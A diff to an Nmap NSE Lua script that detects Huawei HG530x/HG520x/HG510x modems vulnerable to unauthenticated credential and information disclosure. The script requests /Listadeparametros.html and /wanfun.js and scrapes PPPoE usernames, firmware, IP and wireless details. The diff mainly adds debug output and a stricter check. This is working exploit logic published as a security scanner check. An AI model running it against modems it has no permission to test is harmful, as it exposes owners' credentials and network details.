@@ -1,9 +1,3 @@
-local http = require "http"
-local nmap = require "nmap"
-local shortport = require "shortport"
-local string = require "string"
-local vulns = require "vulns"
-
 description = [[
 Detects Huawei modems models HG530x, HG520x, HG510x (and possibly
 others...) vulnerable to a remote credential and information
@@ -60,6 +54,13 @@ author = "Paulino Calderon <calderon () websec mx>"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"exploit","version","vuln"}
 
+local http = require "http"
+local nmap = require "nmap"
+local shortport = require "shortport"
+local string = require "string"
+local vulns = require "vulns"
+local stdnse = require "stdnse"
+
 portrule = shortport.http
 
 action = function(host, port)
@@ -80,15 +81,15 @@ including PPPoE credentials, firmware version, model, gateway, dns servers and a
      }
      
   -- Identify servers that answer 200 to invalid HTTP requests and exit as these would invalidate the tests
-  local _, http_status, _ = http.identify_404( host.ip,port)
+  local _, http_status, _ = http.identify_404(host.ip,port)
   if ( http_status == 200 ) then
+    stdnse.print_debug(1, "%s:Exiting due to ambiguous response from web server. All URIs return status 200", SCRIPT_NAME)
     return false
   end
   
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
   local open_session = http.get(host.ip, port, "/Listadeparametros.html")
   if open_session and open_session.status == 200 then
-    vuln.state = vulns.STATE.EXPLOIT
     local _, _, pppoe_user = string.find(open_session.body, 'Usuario PPPoE:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
     local _, _, model = string.find(open_session.body, 'Modelo de m\195\179dem:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
     local _, _, firmware_version = string.find(open_session.body, 'Versi\195\179n de Firmware:</td><TD class=tablerowvalue>\n(.-)</td></tr><tr>')
@@ -104,6 +105,13 @@ including PPPoE credentials, firmware version, model, gateway, dns servers and a
     local info = string.format("\nModel:%s\nFirmware version:%s\nExternal IP:%s\nGateway IP:%s\nDNS 1:%s\nDNS 2:%s\n"..
                            "Network segment:%s\nActive ethernet connections:%s\nActive wireless connections:%s\nBSSID:%s\nWireless Encryption (Boolean):%s\nPPPoE username:%s\n",
                             model, firmware_version, ip, gateway, dns1, dns2, network_segment, active_ethernet, active_wireless, ssid, encryption, pppoe_user)
+    --Checks if the username string was extracted. If its null, the modem is not vulnerable and we should exit.
+    if pppoe_user then
+      vuln.state = vulns.STATE.EXPLOIT
+    else
+      stdnse.print_debug(1, "%s:Username string was not found in this page. Exiting.", SCRIPT_NAME)
+      return vuln_report:make_output(vuln)
+    end
 
     local ppp = http.get(host.ip, port, "/wanfun.js")
     if ppp.status and ppp.status == 200 then
